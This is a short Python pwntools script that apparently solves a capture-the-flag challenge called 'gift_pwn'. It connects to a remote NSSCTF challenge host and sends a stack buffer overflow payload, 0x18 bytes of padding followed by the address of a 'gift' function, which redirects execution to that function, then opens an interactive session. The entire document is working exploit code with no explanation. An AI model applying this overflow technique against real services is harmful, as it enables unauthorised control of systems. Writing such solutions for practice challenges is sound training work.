from pwn import *
p = remote("node4.anna.nssctf.cn",28559)
elf = ELF("gift_pwn")

gift = elf.sym['gift']


payload = b"a"*0x18 + p64(gift)

p.sendline(payload)

p.interactive()